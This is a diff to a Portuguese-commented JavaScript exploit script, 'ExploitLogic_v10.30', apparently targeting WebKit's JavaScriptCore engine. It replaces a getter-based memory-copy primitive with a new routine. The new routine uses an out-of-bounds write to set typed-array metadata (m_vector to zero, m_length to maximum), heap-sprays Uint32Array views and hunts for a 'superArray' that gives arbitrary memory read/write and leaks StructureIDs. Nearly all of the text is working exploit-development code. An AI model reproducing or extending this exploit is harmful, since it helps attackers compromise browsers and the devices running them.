@@ -14,206 +14,153 @@ import { OOB_CONFIG, JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 // ============================================================
 // DEFINIÇÕES DE CONSTANTES E VARIÁVEIS GLOBAIS
 // ============================================================
-const FNAME_MAIN = "ExploitLogic_v10.29";
+const FNAME_MAIN = "ExploitLogic_v10.30";
 
-const GETTER_PROPERTY_NAME_COPY = "AAAA_GetterForMemoryCopy_v10_29";
-const PLANT_OFFSET_0x6C_FOR_COPY_SRC_DWORD = 0x6C;
-const INTERMEDIATE_PTR_OFFSET_0x68 = 0x68;
-const CORRUPTION_OFFSET_TRIGGER = 0x70;
-const CORRUPTION_VALUE_TRIGGER = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);
-const TARGET_COPY_DEST_OFFSET_IN_OOB = 0x180; // Onde o QWORD lido (JSCell) será copiado
+const CORRUPTION_OFFSET_TRIGGER_0x70 = 0x70; // Onde escrevemos 0xFFFFFFFF_FFFFFFFF
+const CORRUPTION_VALUE_0x70 = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);
 
-let getter_copy_called_flag_v10_29 = false;
+// Offsets DENTRO do oob_array_buffer_real onde preparamos/corrompemos os metadados
+const TARGET_METADATA_AREA_IN_OOB = 0x58; // Início do JSCell do ArrayBufferView hipotético
+const TARGET_MVECTOR_OFFSET_IN_OOB = TARGET_METADATA_AREA_IN_OOB + JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET; // 0x68
+const TARGET_MLENGTH_OFFSET_IN_OOB = TARGET_METADATA_AREA_IN_OOB + JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET; // 0x70
 
-// !!!!! ESTE VALOR SERÁ O ALVO DA DESCOBERTA DESTE SCRIPT !!!!!
-let EXPECTED_UINT32ARRAY_STRUCTURE_ID = null; 
-const PLACEHOLDER_SID_UINT32ARRAY = 0xBADBAD00 | 47; // Novo placeholder
+// Valores desejados para os metadados
+const DESIRED_MVECTOR_VALUE  = AdvancedInt64.Zero; // m_vector = 0
+const DESIRED_MLENGTH_VALUE  = 0xFFFFFFFF;         // m_length = max
 
-// ============================================================
-// PRIMITIVA DE CÓPIA DE MEMÓRIA (VALIDADA)
-// ============================================================
-async function readFromOOBOffsetViaCopy(dword_source_offset_to_read_from) {
-    const FNAME_PRIMITIVE = `${FNAME_MAIN}.readFromOOBOffsetViaCopy`;
-    getter_copy_called_flag_v10_29 = false;
+// Placeholder para o StructureID - um dos objetivos é descobrir isso.
+let DISCOVERED_UINT32ARRAY_SID = null;
+const PLACEHOLDER_SID_FOR_DEBUG = 0xBADBAD00 | 48;
 
-    if (!oob_array_buffer_real || !oob_dataview_real) {
-        await triggerOOB_primitive();
-        if (!oob_array_buffer_real) return new AdvancedInt64(0xDEADDEAD, 0xBADBAD);
-    }
-    // Limpar o destino da cópia para garantir que não estamos lendo lixo antigo
-    oob_write_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, AdvancedInt64.Zero, 8);
-
-    // Plantar o dword_source_offset_to_read_from como a parte baixa do QWORD em PLANT_OFFSET_0x6C.
-    // A parte alta (segundo argumento para AdvancedInt64) não importa para a formação do valor em 0x68.high.
-    const value_to_plant_at_0x6c = new AdvancedInt64(dword_source_offset_to_read_from, 0);
-    oob_write_absolute(PLANT_OFFSET_0x6C_FOR_COPY_SRC_DWORD, value_to_plant_at_0x6c, 8);
-
-    const getterObjectForCopy = {
-        get [GETTER_PROPERTY_NAME_COPY]() {
-            getter_copy_called_flag_v10_29 = true;
-            try {
-                const qword_at_0x68 = oob_read_absolute(INTERMEDIATE_PTR_OFFSET_0x68, 8);
-                const effective_read_offset = qword_at_0x68.high(); // Este DEVE ser dword_source_offset_to_read_from
-
-                if (effective_read_offset === dword_source_offset_to_read_from) {
-                    if (effective_read_offset >= 0 && effective_read_offset < oob_array_buffer_real.byteLength - 8) {
-                        const data_read = oob_read_absolute(effective_read_offset, 8);
-                        oob_write_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, data_read, 8);
-                    } else {
-                        // logS3(`  [GETTER ${GETTER_PROPERTY_NAME_COPY}] Offset de leitura efetivo ${toHex(effective_read_offset)} fora dos limites.`, "warn", FNAME_PRIMITIVE);
-                        oob_write_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, new AdvancedInt64(0x0B000B00,0x0B000B00), 8); // OOB Read Error
-                    }
-                } else {
-                    // logS3(`  [GETTER ${GETTER_PROPERTY_NAME_COPY}] ERRO MÁGICA: effective_read_offset (${toHex(effective_read_offset)}) != dword_source_offset (${toHex(dword_source_offset_to_read_from)})! Qword@0x68 era ${qword_at_0x68.toString(true)}`, "critical", FNAME_PRIMITIVE);
-                    oob_write_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, new AdvancedInt64(0xBAD68BAD, 0xBAD68BAD), 8); // Magic Error
-                }
-            } catch (e_getter) {
-                // logS3(`  [GETTER ${GETTER_PROPERTY_NAME_COPY}] Erro interno: ${e_getter.message}`, "error", FNAME_PRIMITIVE);
-                try {oob_write_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, new AdvancedInt64(0xDEADDEAD,0xBADBAD), 8); } catch(e){} // Getter Error
-            }
-            return "getter_copy_v10_29_done";
-        }
-    };
-
-    oob_write_absolute(CORRUPTION_OFFSET_TRIGGER, CORRUPTION_VALUE_TRIGGER, 8);
-    await PAUSE_S3(5); // Pausa mínima, a "mágica" deve ser rápida
-
-    try { JSON.stringify(getterObjectForCopy); } catch (e) { /* Ignora */ }
-
-    if (!getter_copy_called_flag_v10_29) { 
-        // logS3(`ALERTA: Getter (${GETTER_PROPERTY_NAME_COPY}) NÃO foi chamado!`, "error", FNAME_PRIMITIVE);
-        return null; 
-    }
-    return oob_read_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, 8);
-}
 
 // ============================================================
-// FUNÇÃO PARA LER StructureID USANDO A PRIMITIVA DE CÓPIA
-// ============================================================
-async function getStructureIDFromOOB(offset_of_jscell_in_oob) {
-    if (!oob_array_buffer_real || offset_of_jscell_in_oob < 0 || offset_of_jscell_in_oob >= oob_array_buffer_real.byteLength - 8) {
-        return null;
-    }
-    const copied_qword = await readFromOOBOffsetViaCopy(offset_of_jscell_in_oob);
-    
-    // Verificar se a cópia retornou um valor de erro da primitiva
-    if (copied_qword === null || 
-        (isAdvancedInt64Object(copied_qword) && copied_qword.low() === 0xBADBAD && copied_qword.high() === 0xDEADDEAD) ||
-        (isAdvancedInt64Object(copied_qword) && copied_qword.low() === 0xBAD68BAD && copied_qword.high() === 0xBAD68BAD) ||
-        (isAdvancedInt64Object(copied_qword) && copied_qword.low() === 0x0B000B00 && copied_qword.high() === 0x0B000B00) ) {
-        return null; // Indica falha na leitura ou erro da primitiva
-    }
-    
-    if (isAdvancedInt64Object(copied_qword)) {
-        return copied_qword.low(); // StructureID + Flags nos 4 bytes baixos do JSCell
-    }
-    return null;
-}
-
-// ============================================================
-// FUNÇÃO PRINCIPAL DE INVESTIGAÇÃO (v10.29)
+// FUNÇÃO PRINCIPAL DE INVESTIGAÇÃO (v10.30)
 // ============================================================
 export async function sprayAndInvestigateObjectExposure() {
-    const FNAME_CURRENT_TEST = `${FNAME_MAIN}.discoverSID_v10.29`;
-    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Descoberta de StructureID de Uint32Array (Scan Intensivo Refinado) ---`, "test", FNAME_CURRENT_TEST);
+    const FNAME_CURRENT_TEST = `${FNAME_MAIN}.activateSuperArrayWithDirectByteCorruption_v10.30`;
+    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Teste de SuperArray com Corrupção Direta de Bytes ---`, "test", FNAME_CURRENT_TEST);
 
-    let sprayedU32Arrays = [];
+    const NUM_SPRAY_VIEWS = 250;
+    const SPRAY_VIEW_ELEMENT_COUNT = 8; // Uint32Array(8)
+
+    let sprayedVictimViews = [];
+    let superArray = null;
+    let superArrayIndex = -1;
 
     try {
         await triggerOOB_primitive();
-        if (!oob_array_buffer_real) { throw new Error("OOB Init falhou."); }
+        if (!oob_array_buffer_real || !oob_dataview_real) {
+            throw new Error("OOB Init falhou.");
+        }
         logS3("Ambiente OOB inicializado.", "info", FNAME_CURRENT_TEST);
-        logS3(`   OBJETIVO: Encontrar o StructureID de Uint32Array. Placeholder atual: ${toHex(PLACEHOLDER_SID_UINT32ARRAY)}`, "info", FNAME_CURRENT_TEST);
 
-        // --- PASSO 1: Pulverizar Uint32Arrays بكثافة ---
-        logS3("PASSO 1: Pulverizando Uint32Arrays para descoberta de SID...", "info", FNAME_CURRENT_TEST);
-        const NUM_U32_SPRAY = 400; // Aumentar ainda mais
-        const U32_SPRAY_LEN_BASE = 1; // Objetos ainda menores (1 elemento = 4 bytes de dados + header)
-        sprayedU32Arrays = [];
-        for (let i = 0; i < NUM_U32_SPRAY; i++) {
-            sprayedU32Arrays.push(new Uint32Array(U32_SPRAY_LEN_BASE + (i % 4))); // Tamanhos de 1 a 4 elementos
-        }
-        logS3(`  ${sprayedU32Arrays.length} Uint32Arrays pulverizados.`, "info", FNAME_CURRENT_TEST);
-        await PAUSE_S3(1000); // Dar mais tempo para a heap assentar
-
-        let found_sids_map = {};
-        const SCAN_START = 0x040; 
-        const SCAN_END = Math.min(0x7F00, oob_array_buffer_real.byteLength - 0x20); // Scan até ~31.75KB
-        const SCAN_STEP_SID = 0x04; 
-
-        logS3(`  Escaneando de ${toHex(SCAN_START)} a ${toHex(SCAN_END)} com passo ${toHex(SCAN_STEP_SID)} por SIDs... (PODE SER EXTREMAMENTE LENTO!)`, "warn", FNAME_CURRENT_TEST);
-        let sids_found_in_scan = 0;
-        const known_ab_sid = JSC_OFFSETS.ArrayBuffer.KnownStructureIDs.ArrayBuffer_STRUCTURE_ID;
-
-        for (let offset = SCAN_START; offset < SCAN_END; offset += SCAN_STEP_SID) {
-            let sid = await getStructureIDFromOOB(offset); // Usa a primitiva atualizada
-            if (sid !== null && sid !== 0 && sid !== 0xFFFFFFFF) {
-                if (typeof known_ab_sid === 'number' && (sid & 0xFFFFFFF0) === (known_ab_sid & 0xFFFFFFF0)) { // Ignora AB SID (considerando poucas flags)
-                    continue; 
-                }
-                // Filtros para padrões de preenchimento comuns
-                if (sid === 0xCAFEBABE || sid === 0xBADBAD00 || sid === 0xFEFEFEFE || sid === 0xDEADBEEF) {
-                    continue;
-                }
-                
-                found_sids_map[sid] = (found_sids_map[sid] || 0) + 1;
-                sids_found_in_scan++;
-
-                if (found_sids_map[sid] <= 5 || found_sids_map[sid] % 50 === 0) { // Loga as primeiras 5 e depois a cada 50
-                     logS3(`    Offset ${toHex(offset)}: SID Potencial = ${toHex(sid)} (Contagem: ${found_sids_map[sid]})`, "leak", FNAME_CURRENT_TEST);
-                }
-            }
-            // Log de progresso menos frequente para scan denso
-            if (offset > SCAN_START && offset % (SCAN_STEP_SID * 2048) === 0) { // A cada ~8KB
-                logS3(`    Scan em ${toHex(offset)}... SIDs únicos até agora: ${Object.keys(found_sids_map).length}`, "info", FNAME_CURRENT_TEST);
-                await PAUSE_S3(5); 
+        // 1. Heap Spraying: Criar VIEWS sobre o oob_array_buffer_real
+        //    Isto é crucial: se m_vector for 0, a view deve operar sobre oob_array_buffer_real.
+        logS3(`FASE 1: Pulverizando ${NUM_SPRAY_VIEWS} Uint32Array views sobre oob_array_buffer_real...`, "info", FNAME_CURRENT_TEST);
+        let current_data_offset_for_view = (OOB_CONFIG.BASE_OFFSET_IN_DV || 0) + 0x800; // Dados das views longe da área de metadados (0x58)
+        for (let i = 0; i < NUM_SPRAY_VIEWS; i++) {
+            const view_byte_length = SPRAY_VIEW_ELEMENT_COUNT * 4;
+            if (current_data_offset_for_view + view_byte_length > oob_array_buffer_real.byteLength) break;
+            try {
+                let view = new Uint32Array(oob_array_buffer_real, current_data_offset_for_view, SPRAY_VIEW_ELEMENT_COUNT);
+                view[0] = (0xFACE0000 | i); // Marcador nos DADOS da view
+                sprayedVictimViews.push(view);
+                current_data_offset_for_view += view_byte_length + 0x80; // Espaçar bem os dados das views
+            } catch (e_spray) {
+                logS3(`Erro no spray ${i}: ${e_spray.message}`, "warn", FNAME_CURRENT_TEST);
+                break;
             }
         }
-        logS3(`  Scan concluído. Total de ${sids_found_in_scan} SIDs potenciais (filtrados) encontrados.`, "info", FNAME_CURRENT_TEST);
+        logS3(`Pulverização de ${sprayedVictimViews.length} views concluída.`, "info", FNAME_CURRENT_TEST);
+        await PAUSE_S3(300);
 
-        let sorted_sids = Object.keys(found_sids_map).map(k => parseInt(k)).sort((a,b) => found_sids_map[b] - found_sids_map[a]);
-
-        logS3("  Frequência dos SIDs encontrados (top 15 mais frequentes, filtrados por heurística):", "info", FNAME_CURRENT_TEST);
-        let displayed_sids_count = 0;
-        let most_frequent_sid_val = null; 
-        let max_freq = 0;
-
-        for(let i=0; i < sorted_sids.length && displayed_sids_count < 15; i++) {
-            const sid_val = sorted_sids[i];
-            const current_freq = found_sids_map[sid_val];
-            // Heurística para SIDs de objetos JS (geralmente não são valores pequenos como 0x1, 0x2, etc., ou muito repetitivos como um padrão)
-            if (current_freq > 2 && sid_val > 0x10000 && sid_val < 0x7FFFFFFF) { 
-                logS3(`    - SID: ${toHex(sid_val)}  Contagem: ${current_freq}`, "info", FNAME_CURRENT_TEST);
-                displayed_sids_count++;
-                if (current_freq > max_freq) {
-                    max_freq = current_freq;
-                    most_frequent_sid_val = sid_val;
-                }
-            }
-        }
+        // 2. Corromper diretamente os bytes em TARGET_MVECTOR_OFFSET_IN_OOB (0x68) e TARGET_MLENGTH_OFFSET_IN_OOB (0x70)
+        logS3(`FASE 2: Corrompendo bytes em ${toHex(TARGET_MVECTOR_OFFSET_IN_OOB)} e ${toHex(TARGET_MLENGTH_OFFSET_IN_OOB)} no oob_array_buffer_real...`, "info", FNAME_CURRENT_TEST);
         
-        // Condição para aceitar o SID: deve ser o mais frequente E ter uma contagem mínima.
-        if (most_frequent_sid_val !== null && max_freq > Math.min(NUM_U32_SPRAY / 50, 10)) { // Pelo menos 1/50 do spray, ou 10
-            EXPECTED_UINT32ARRAY_STRUCTURE_ID = most_frequent_sid_val;
-            logS3(`  !!!! StructureID MAIS PROMISSOR (candidato para Uint32Array): ${toHex(EXPECTED_UINT32ARRAY_STRUCTURE_ID)} (contagem: ${max_freq}) !!!!`, "vuln", FNAME_CURRENT_TEST);
-            logS3("    >>>> COPIE ESTE VALOR PARA A CONSTANTE EXPECTED_UINT32ARRAY_STRUCTURE_ID NO TOPO DO ARQUIVO! <<<<", "critical", FNAME_CURRENT_TEST);
-            document.title = `U32 SID? ${toHex(EXPECTED_UINT32ARRAY_STRUCTURE_ID)}`;
-        } else {
-            logS3("  Nenhum candidato a StructureID de Uint32Array suficientemente proeminente/confiável encontrado.", "warn", FNAME_CURRENT_TEST);
-            EXPECTED_UINT32ARRAY_STRUCTURE_ID = PLACEHOLDER_SID_UINT32ARRAY;
-        }
-        logS3(`EXPECTED_UINT32ARRAY_STRUCTURE_ID (final para este run): ${toHex(EXPECTED_UINT32ARRAY_STRUCTURE_ID)}`, "info", FNAME_CURRENT_TEST);
+        // Escrever o m_vector desejado (0) em 0x68
+        oob_write_absolute(TARGET_MVECTOR_OFFSET_IN_OOB, DESIRED_MVECTOR_VALUE, 8);
+        
+        // Escrever 0xFFFFFFFF_FFFFFFFF em 0x70 (CORRUPTION_OFFSET_TRIGGER)
+        // Isso definirá m_length (em 0x70) para 0xFFFFFFFF e m_mode (em 0x74) para 0xFFFFFFFF
+        oob_write_absolute(CORRUPTION_OFFSET_TRIGGER_0x70, CORRUPTION_VALUE_0x70, 8);
+        await PAUSE_S3(100);
 
-        if (EXPECTED_UINT32ARRAY_STRUCTURE_ID !== PLACEHOLDER_SID_UINT32ARRAY) {
-            logS3(`  Próximo passo: Usar SID ${toHex(EXPECTED_UINT32ARRAY_STRUCTURE_ID)} para corromper um Uint32Array real e tentar criar o 'superArray'.`, "info", FNAME_CURRENT_TEST);
+        // Verificar os bytes no oob_array_buffer_real
+        const val_mvec = oob_read_absolute(TARGET_MVECTOR_OFFSET_IN_OOB, 8);
+        const val_mlen = oob_read_absolute(TARGET_MLENGTH_OFFSET_IN_OOB, 4);
+        logS3(`  Bytes em oob_array_buffer_real: mvec@${toHex(TARGET_MVECTOR_OFFSET_IN_OOB)}=${val_mvec.toString(true)}, mlen@${toHex(TARGET_MLENGTH_OFFSET_IN_OOB)}=${toHex(val_mlen)}`, "info", FNAME_CURRENT_TEST);
+
+        const isVectorCorruptedAsExpected = isAdvancedInt64Object(val_mvec) && val_mvec.low() === DESIRED_MVECTOR_VALUE.low() && val_mvec.high() === DESIRED_MVECTOR_VALUE.high();
+        const isLengthCorruptedAsExpected = val_mlen === DESIRED_MLENGTH_VALUE;
+
+        if (isVectorCorruptedAsExpected && isLengthCorruptedAsExpected) {
+            logS3("    Bytes em 0x68/0x70 foram definidos para m_vector=0, m_length=MAX com sucesso no oob_array_buffer_real.", "good", FNAME_CURRENT_TEST);
+        } else {
+            logS3("    AVISO: Os bytes em 0x68/0x70 NÃO foram definidos como esperado. O teste do superArray pode falhar.", "warn", FNAME_CURRENT_TEST);
+            logS3(`      Encontrado: mvec=${val_mvec.toString(true)}, mlen=${toHex(val_mlen)}`, "warn", FNAME_CURRENT_TEST);
+            // Não retornar, pois a instabilidade pode ainda ter ativado um superArray
         }
+
+        // 3. Tentar Identificar e Usar o "Super Array" (View)
+        logS3(`FASE 3: Tentando identificar uma "Super View" entre as ${sprayedVictimViews.length} pulverizadas...`, "info", FNAME_CURRENT_TEST);
+        const MARKER_VALUE = 0xABCDABCD;
+        const MARKER_TEST_OFFSET = 0xC0; // Offset no oob_array_buffer_real para o marcador
+        const MARKER_TEST_INDEX = MARKER_TEST_OFFSET / 4;
+
+        let original_value_at_marker = 0;
+        try { original_value_at_marker = oob_read_absolute(MARKER_TEST_OFFSET, 4); } catch(e){}
+        oob_write_absolute(MARKER_TEST_OFFSET, MARKER_VALUE, 4);
+        logS3(`  Marcador ${toHex(MARKER_VALUE)} escrito em oob_buffer[${toHex(MARKER_TEST_OFFSET)}]`, "info", FNAME_CURRENT_TEST);
+
+        for (let i = 0; i < sprayedVictimViews.length; i++) {
+            try {
+                // Se os metadados REAIS de sprayedVictimViews[i] (na heap JS)
+                // foram corrompidos para usar m_vector=0 e m_length=MAX
+                // E seu ArrayBuffer associado é oob_array_buffer_real,
+                // então esta leitura deve funcionar.
+                if (sprayedVictimViews[i][MARKER_TEST_INDEX] === MARKER_VALUE) {
+                    logS3(`    !!!! SUPER ARRAY (VIEW) POTENCIALMENTE ENCONTRADO !!!! sprayedVictimViews[${i}] (marcador de dados: ${toHex(sprayedVictimViews[i][0])})`, "vuln", FNAME_CURRENT_TEST);
+                    superArray = sprayedVictimViews[i];
+                    superArrayIndex = i;
+                    document.title = `SUPER VIEW[${i}] ATIVA!`;
+                    
+                    // Tentar ler o StructureID do objeto cujos metadados *deveriam* estar em TARGET_METADATA_AREA_IN_OOB (0x58)
+                    // usando o superArray, que agora lê do início do oob_array_buffer_real.
+                    const sid_read_addr = TARGET_METADATA_AREA_IN_OOB + JSC_OFFSETS.ArrayBufferView.STRUCTURE_ID_OFFSET; // 0x58
+                    if (sid_read_addr % 4 === 0 && superArray.length > (sid_read_addr / 4)) {
+                        const sid_val_from_super = superArray[sid_read_addr / 4];
+                        logS3(`      LIDO COM SUPERARRAY: Conteúdo em ${toHex(sid_read_addr)} (potencial SID da 'armadilha') é ${toHex(sid_val_from_super)}`, "leak", FNAME_CURRENT_TEST);
+                        // Se este SID lido de 0x58 for válido e não o que plantamos lá (se plantamos um diferente),
+                        // pode ser o SID real de um objeto Uint32Array que foi pulverizado ali.
+                        if (sid_val_from_super !== 0 && sid_val_from_super !== 0xFFFFFFFF && (sid_val_from_super & 0xFFFF0000) !== 0xCAFE0000) {
+                             DISCOVERED_UINT32ARRAY_SID = sid_val_from_super;
+                             logS3(`        >>>> POTENCIAL STRUCTUREID REAL (de 0x58) DESCOBERTO: ${toHex(DISCOVERED_UINT32ARRAY_SID)} <<<<`, "vuln", FNAME_CURRENT_TEST);
+                             document.title = `SUPERVIEW SID=${toHex(DISCOVERED_UINT32ARRAY_SID)}`;
+                        }
+                    }
+                    break; 
+                }
+            } catch (e_access) { /* Ignora */ }
+        }
+        try {oob_write_absolute(MARKER_TEST_OFFSET, original_value_at_marker, 4); } catch(e){} // Restaurar
+
+        if (superArray) {
+            logS3(`    Primitiva de Leitura/Escrita via 'superArray' (sprayedVictimViews[${superArrayIndex}]) parece funcional!`, "vuln", FNAME_CURRENT_TEST);
+            logS3(`      superArray.length (JS): ${superArray.length}`, "info", FNAME_CURRENT_TEST);
+            if(DISCOVERED_UINT32ARRAY_SID) {
+                 logS3(`      EXPECTED_UINT32ARRAY_STRUCTURE_ID agora é: ${toHex(DISCOVERED_UINT32ARRAY_SID)}. ATUALIZE A CONSTANTE NO CÓDIGO!`, "critical", FNAME_CURRENT_TEST);
+            }
+        } else {
+            logS3("    Não foi possível identificar a 'superArray' (View) específica via teste de marcador.", "warn", FNAME_CURRENT_TEST);
+        }
+        logS3("INVESTIGAÇÃO CONCLUÍDA.", "test", FNAME_CURRENT_TEST);
 
     } catch (e) {
         logS3(`ERRO CRÍTICO em ${FNAME_CURRENT_TEST}: ${e.message}`, "critical", FNAME_CURRENT_TEST);
         if (e.stack) logS3(`Stack: ${e.stack}`, "critical", FNAME_CURRENT_TEST);
         document.title = `${FNAME_MAIN} FALHOU!`;
     } finally {
-        sprayedU32Arrays = [];
+        sprayedVictimViews = [];
         clearOOBEnvironment();
         logS3(`--- ${FNAME_CURRENT_TEST} Concluído ---`, "test", FNAME_CURRENT_TEST);
     }
